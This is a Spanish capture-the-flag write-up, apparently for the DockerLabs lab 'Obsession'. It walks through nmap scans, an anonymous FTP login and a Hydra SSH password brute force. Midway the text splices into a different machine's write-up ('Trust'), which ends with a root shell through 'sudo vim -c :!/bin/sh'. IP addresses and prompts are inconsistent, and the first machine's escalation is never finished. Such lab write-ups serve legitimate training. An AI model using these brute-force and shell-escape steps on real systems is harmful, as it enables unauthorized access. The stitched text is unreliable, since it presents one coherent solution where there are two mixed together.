# OBSESSION
## INDICACIONES PREVIAS
* Sistema operativo: Kali Linux
* Terminal: ZSH Powerlevel10K
* Utilidad mkt definida en la zshrc para la creación automática de directorios nmap, content y scripts.
* Cat aliseado como bat.
## DESPLIEGUE DE MÁQUINA
1. Descargarla desde la plataforma DockerLabs.
2. En mi caso, yo me creo un directorio con el nombre de la máquina para tenerlo todo más organizado, por lo que mediante el comando mv (`mv ~/Downloads/<máquina.zip> ~/Desktop/Máquinas/Dockerlabs/<máquina>`) la moveré de descargas a la nueva ubicación.
3. Una vez hecho esto, la descomprimiremos mediante unzip <máquina.zip> y se nos creará un ejecutable .tar
4. Por último, la desplegaremos mediante sudo bash auto_deploy.sh <máquina.tar> y se nos proporcionará una IP, en mi caso 172.18.0.2.
## EXPLOTACIÓN Y ESCALADA DE PRIVILEGIOS
Primero comprobaremos la conectividad con la máquina. 
```ruby
> ping -c1 172.18.0.2
PING 172.17.0.2 (172.18.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=4.45 ms

--- 172.18.0.2 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 4.447/4.447/4.447/0.000 ms
```

* c1 (count 1) para indicar que solo queremos mandar un paquete ICMP y después termine de enviar paquetes. 

* De aquí podemos observar que: 
  * Se ha enviado un paquete y se ha recibido de vuelta, por lo que hay conectividad con la máquina.
  * Tenemos un ttl = 64, lo que quiere decir que nos encontramos ante un sistema Linux.

Una vez visto que tenemos conectividad comenzaremos con el escaneo de puertos.  Para ello ejecutaremos:
```ruby
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.18.0.2 -oG allPorts
```
* Con -p- escaneamos el rango completo de puertos (65535).
* Con --open añadimos que de esos solo nos interesan los abiertos.
* Con -sS seleccionamos que el tipo de escaneo será de tipo SYN Scan. Este se caracteriza por ser rápido y sigiloso puesto que no se completa el three-way handshake.
  * Según la respuesta del puerto, Nmap deduce su estado:
    * SYN/ACK recibido → el puerto está abierto.
    * RST (Reset) recibido → el puerto está cerrado.
    * Sin respuesta o ICMP error → el puerto está filtrado (por firewall).
  * Si el puerto estaba abierto (SYN/ACK), Nmap no completa la conexión: envía un RST para interrumpir el handshake y no dejar un rastro evidente.
* Con --min-rate 5000 indicamos que queremos un envío de 5000 paquetes por segundo.
* Con -vvv (triple verbose) se muestra por consola la información detallada y actualizada al momento.
* Con -n indicaremos que no queremos resolución DNS, trabajaremos directamente con direcciones IP.
* Con -Pn queremos que no se haga ping al host antes de comenzar el escaneo, asumiendo que está activo.
* Por último, con -oG exportamos la evidencia en un archivo con formato grepeable para facilitar su procesamiento en auditorias.

Para simplificarnos el visionado de los puertos abiertos directamente abriremos el archivo *allPorts*.
```ruby
❯ cat allPorts
───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: allPorts
───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ # Nmap 7.95 scan initiated Tue Sep 16 12:27:58 2025 as: /usr/lib/nmap/nmap --privileged -p- --open -sS --min-rate 5000 -vvv -n -Pn -oG allPorts 172.17.0.2
   2   │ # Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
   3   │ Host: 172.17.0.2 () Status: Up
   4   │ Host: 172.17.0.2 () Ports: 21/open/tcp//ftp///, 22/open/tcp//ssh///, 80/open/tcp//http///   Ignored State: closed (65532)
   5   │ # Nmap done at Tue Sep 16 12:28:01 2025 -- 1 IP address (1 host up) scanned in 2.96 seconds
───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```
Una vez localizados los puertos abiertos, continuaremos con el escaneo específico de los mismos para ver que servicios y versiones corren por ellos.
```bash
❯ nmap -p22,80 -sCV 172.18.0.2 -oN targeted
```

* El parámetro -sCV es una conjunción de los parámetros:
  * -sC: Ejecuta los scripts de Nmap por defecto (Default Scripts) para el host/puerto para detectar vulnerabilidades básicas, información de banners, servicios públicos, etc..
  * -sV: Detecta la versión del servicio que corre en cada puerto abierto.
* Con -oN exportamos la evidencia en un archivo con formato Nmap para dejarlo registrado.

Al igual que antes, para que la visualización de toda la información sea más cómoda, la analizaremos desde el archivo *targeted* que acabamos de generar.
```java
❯ cat targeted -l java
───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: targeted
───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ # Nmap 7.95 scan initiated Tue Sep 16 12:28:32 2025 as: /usr/lib/nmap/nmap --privileged -p21,22,80 -sCV -oN targeted 172.17.0.2
   2   │ Nmap scan report for 172.17.0.2
   3   │ Host is up (0.00s latency).
   4   │ 
   5   │ PORT   STATE SERVICE VERSION
   6   │ 21/tcp open  ftp     vsftpd 3.0.5
   7   │ | ftp-syst: 
   8   │ |   STAT: 
   9   │ | FTP server status:
  10   │ |      Connected to ::ffff:172.17.0.1
  11   │ |      Logged in as ftp
  12   │ |      TYPE: ASCII
  13   │ |      No session bandwidth limit
  14   │ |      Session timeout in seconds is 300
  15   │ |      Control connection is plain text
  16   │ |      Data connections will be plain text
  17   │ |      At session startup, client count was 2
  18   │ |      vsFTPd 3.0.5 - secure, fast, stable
  19   │ |_End of status
  20   │ | ftp-anon: Anonymous FTP login allowed (FTP code 230)
  21   │ | -rw-r--r--    1 0        0             667 Jun 18  2024 chat-gonza.txt
  22   │ |_-rw-r--r--    1 0        0             315 Jun 18  2024 pendientes.txt
  23   │ 22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13 (Ubuntu Linux; protocol 2.0)
  24   │ | ssh-hostkey: 
  25   │ |   256 60:05:bd:a9:97:27:a5:ad:46:53:82:15:dd:d5:7a:dd (ECDSA)
  26   │ |_  256 0e:07:e6:d4:3b:63:4e:77:62:0f:1a:17:69:91:85:ef (ED25519)
  27   │ 80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
  28   │ |_http-server-header: Apache/2.4.58 (Ubuntu)
  29   │ |_http-title: Russoski Coaching
  30   │ MAC Address: 02:42:AC:11:00:02 (Unknown)
  31   │ Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
  32   │ 
  33   │ Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  34   │ # Nmap done at Tue Sep 16 12:28:40 2025 -- 1 IP address (1 host up) scanned in 7.76 seconds
───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```
Esta máquina tiene dos formas fáciles de resolverse:

### 1. EXPLOTACION FTP
En el puerto 22 nos encontramos con un servicio *OpenSSH* actualizado a una versión relativamente reciente, lo que indica que no presenta ninguna vulnerabilidad conocida (versiones < 7.7).  Continuaremos con el servicio FTP, el cual pasaremos por la herramienta [SearchSploit](https://github.com/topics/searchsploit) para ver si presenta alguna vulnerabilidad.
```ruby
❯ searchsploit "vsftpd 3.0.5"
Exploits: No Results
Shellcodes: No Results
```
Este servicio tampoco presenta ninguna vulnerabilidad conocida pero sí que permite el login con usuario *Anónimo*.  Vamos a ver que encontramos.

```ruby
❯ ftp 172.17.0.2
Connected to 172.17.0.2.
220 (vsFTPd 3.0.5)
Name (172.17.0.2:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls 
229 Entering Extended Passive Mode (|||20864|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             667 Jun 18  2024 chat-gonza.txt
-rw-r--r--    1 0        0             315 Jun 18  2024 pendientes.txt
226 Directory send OK.
ftp> mget chat-gonza.txt pendientes.txt
mget chat-gonza.txt [anpqy?]? 
229 Entering Extended Passive Mode (|||48381|)
150 Opening BINARY mode data connection for chat-gonza.txt (667 bytes).
100% |************************************************************************************************************************************************|   667        0.65 KiB/s    --:-- ETA
226 Transfer complete.
667 bytes received in 00:00 (0.65 KiB/s)
mget pendientes.txt [anpqy?]? 
229 Entering Extended Passive Mode (|||59834|)
150 Opening BINARY mode data connection for pendientes.txt (315 bytes).
100% |************************************************************************************************************************************************|   315        0.30 KiB/s    --:-- ETA
226 Transfer complete.
315 bytes received in 00:00 (0.30 KiB/s)
```
Podemos observar que el login anónimo ha dado resultado y nos hemos encontrado con dos archivos de texto los cuales, haciendo uso del comando `mget`, nos los hemos traidoa nuestra máquina Kali.

```bash
❯ cat chat-gonza.txt pendientes.txt
───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: chat-gonza.txt
───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ [16:21, 16/6/2024] Gonza: pero en serio es tan guapa esa tal Nágore como dices?
   2   │ [16:28, 16/6/2024] Russoski: es una auténtica princesa pff, le he hecho hasta un vídeo y todo, lo tengo ya subido y tengo la URL guardada
   3   │ [16:29, 16/6/2024] Russoski: en mi ordenador en una ruta segura, ahora cuando quedemos te lo muestro si quieres
   4   │ [21:52, 16/6/2024] Gonza: buah la verdad tenías razón eh, es hermosa esa chica, del 9 no baja
   5   │ [21:53, 16/6/2024] Gonza: por cierto buen entreno el de hoy en el gym, noto los brazos bastante hinchados, así sí
   6   │ [22:36, 16/6/2024] Russoski: te lo dije, ya sabes que yo tengo buenos gustos para estas cosas xD, y sí buen training hoy
───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: pendientes.txt
───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ 1 Comprar el Voucher de la certificación eJPTv2 cuanto antes!
   2   │ 
   3   │ 2 Aumentar el precio de mis asesorías online en la Web!
   4   │ 
   5   │ 3 Terminar mi laboratorio vulnerable para la plataforma Dockerlabs!
   6   │ 
   7   │ 4 Cambiar algunas configuraciones de mi equipo, creo que tengo ciertos
   8   │   permisos habilitados que no son del todo seguros..
───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────```
```
En el primer archivo nos encontramos con lo que parece un chat entre dos usuarios de sistema, *Gonza* y *Russoski*.  Por el uso de la primera persona del singular puedo interpretar que estamos tomando el papel de Russoski.  Además, en el segundo archivo se nos esta desvelando que con este usuario de sistema tenemos unos permisos habilitados así que, vamos a probar en el servicio *OpenSSH*.

Haremos uso de la herramienta de fuerza bruta [Hydra](https://github.com/vanhauser-thc/thc-hydra) utilizando *russoski* como nombre de usuario y el diccionario [rockyou](https://github.com/topics/rockyou-wordlist) para comprobar contraseñas.
```py
❯ hydra -l russoski -P /usr/share/wordlists/rockyou.txt -f ssh://172.17.0.2
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-16 12:53:49
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: russoski   password: iloveme
[STATUS] attack finished for 172.17.0.2 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-09-16 12:54:21
```
* Con -l seleccionamos el usuario.
* Con -P indicamos un conjunto de contraseñas a probar, en este caso, las recogidas en el diccionario.
* Por último indicamos el servicio y la dirección sobre la que ejecutar el ataque.

Vemos que este ataque ha sido satisfactorio y hemos encontrado una contraseña válida para el usuario *russoski*.
Ahora que ya tenemos usuario y contraseña accederemos al servicio SSH para comenzar con el escalado de privilegios.
```ruby
❯ ssh russoski@172.17.0.2
russoski@172.17.0.2's password: 
Welcome to Ubuntu 24.04 LTS (GNU/Linux 6.12.38+kali-amd64 x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Tue Sep 16 13:15:06 2025 from 172.17.0.1
russoski@9cc448a7c0a7:~$ whoami
russoski
``` 

Para continuar, vamos a intentar listar todos los privilegios de *sudo* del usuario actual. Es decir, mostrar qué comandos puede ejecutar con sudo y cómo.
```ruby
lovely@90f44a27e698:~$ sudo -l
-bash: sudo: command not found
```
Vemos que nos ha devuelto que el comando *sudo* no se ha encontrado así que no listaremos permisos de sudoers.  Esto puede ser por:
* El sistema está minimalista (por ejemplo, contenedores, sistemas de pruebas, o ciertos servidores SSH).
* Tu usuario no tiene permisos para sudo, o sudo no está instalado.

La siguiente opción es buscar permisos SUID.  El SUID (Set User ID) es un bit especial de permisos en sistemas tipo Unix/Linux que se aplica a archivos ejecutables. Su función principal es permitir que un programa se ejecute con los permisos del propietario del archivo, en lugar de los permisos del usuario que lo ejecuta. Esto puede ser útil para ciertas tareas que requieren privilegios elevados, sin dar acceso completo al usuario.  Para ello ejecutaremos: 






























![Panel de Apache](https://github.com/JavieRR13/WriteUps/blob/1c1a5bf7b5a14bf09e12fc52180fde1e3514e8f0/DockerLabs/Muy%20f%C3%A1cil/Trust/Im%C3%A1genes/Trust_Apache.png)

Tras acceder a la web nos encontramos con un panel de Apache por defecto del cual, a simple vista, no parece que vayamos a sacar mucho.  Como tampoco tenemos ningún usuario de sistema válido para intentar fuerza bruta sobre el servicio SSH, probaremos a buscar recursos, directorios o subdominios que pueda permanecer ocultos con la herramienta [gobuster](https://github.com/OJ/gobuster). 
```java
❯ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u 'http://172.18.0.2' -x .php,.py,.txt,.sh
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.18.0.2
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              php,py,txt,sh
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/secret.php           (Status: 200) [Size: 927]
/server-status        (Status: 403) [Size: 275]
Progress: 1038205 / 1038205 (100.00%)
===============================================================
Finished
===============================================================
```
* Con dir indicamos que queremos el modo escaneo de directorios.
* Con -w indicamos el diccionario a utilizar, en mi caso uno de [Seclists](https://github.com/danielmiessler/SecLists).
* Con -u indicamos la url.
* Con -x seleccionamos la extensión de archivos que queremos buscar.

Podemos observar que, tras el escaneo que duró unos pocos segundos, se nos ha devuelto un status code 200 en el archivo *secret.php*. Con esto, nos dirigiremos al navegador para comprobar que es.
![Mensaje](https://github.com/JavieRR13/WriteUps/blob/8f7742950694bd6cce9ba76009eb43a6e12d5b34/DockerLabs/Muy%20f%C3%A1cil/Trust/Im%C3%A1genes/Trust_Mensaje.png)
Nos encontramos frente a una página en blanco con un mensaje con un nombre en el centro.  Además, inspeccionando el código fuente de la página no parece haber nada sospechoso, por lo que solo podemos interpretar que este nombre pueda ser un usuario válido de sistema y probarlo en el servicio SSH utilizando fuerza bruta con la herramienta [Hydra](https://github.com/vanhauser-thc/thc-hydra) y el diccionario de [rockyou](https://github.com/topics/rockyou-wordlist).
```ruby
❯ hydra -l mario -P /usr/share/wordlists/rockyou.txt ssh://172.18.0.2
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-08 10:56:19
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://172.18.0.2:22/
[22][ssh] host: 172.18.0.2   login: mario   password: chocolate
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 3 final worker threads did not complete until end.
[ERROR] 3 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-09-08 10:56:28
```
* Con -l seleccionamos el usuario.
* Con -P indicamos un conjunto de contraseñas a probar, en este caso, las recogidas en el diccionario.
* Por último indicamos el servicio y la dirección sobre la que ejecutar el ataque.

Vemos que este ataque ha sido satisfactorio y hemos encontrado una contraseña válida para el usuario *mario*.
Ahora que ya tenemos usuario y contraseña accederemos al servicio SSH para comenzar con el escalado de privilegios.
```ruby
❯ ssh mario@172.18.0.2
mario@172.18.0.2's password: 
Linux 99ebdb36daec 6.12.38+kali-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.12.38-1kali1 (2025-08-12) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Mar 20 09:54:46 2024 from 192.168.0.21
mario@99ebdb36daec:~$ whoami
mario
```
Una vez dentro de la máquina víctima, vamos a intentar listar todos los privilegios de sudo del usuario actual. Es decir, mostrar qué comandos puede ejecutar con sudo y cómo. 
```ruby
mario@99ebdb36daec:~$ sudo -l
[sudo] password for mario: 
Matching Defaults entries for mario on 99ebdb36daec:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User mario may run the following commands on 99ebdb36daec:
    (ALL) /usr/bin/vim
```
Sabiendo que podemos ejecutar Vim[^1] con permisos de administrador, podemos buscar en [GTFOBins](https://gtfobins.github.io/gtfobins/vim/) alguna forma de establecer una shell remota, puesto que esta se ejecutará con los permisos del usuario que la haya lanzado. 
![GTFOBins vim](https://github.com/JavieRR13/WriteUps/blob/6be73eb8c1de22d9b38e2720c90c945007edde78/DockerLabs/Muy%20f%C3%A1cil/Trust/Im%C3%A1genes/Trust_GTFOBinsvim.png)
```ruby
mario@99ebdb36daec:~$ sudo vim -c ':!/bin/sh'

# whoami
root
# 
```
🥳CONSEGUIDO, SOMOS ROOT🥳
[^1]: Vim es un editor de texto para sistemas Unix/Linux que, al poder ejecutarse con sudo, se convierte en una vía de escalada de privilegios porque permite lanzar comandos de sistema desde dentro del editor (por ejemplo con :!bash), lo que posibilita abrir una shell con permisos de root.
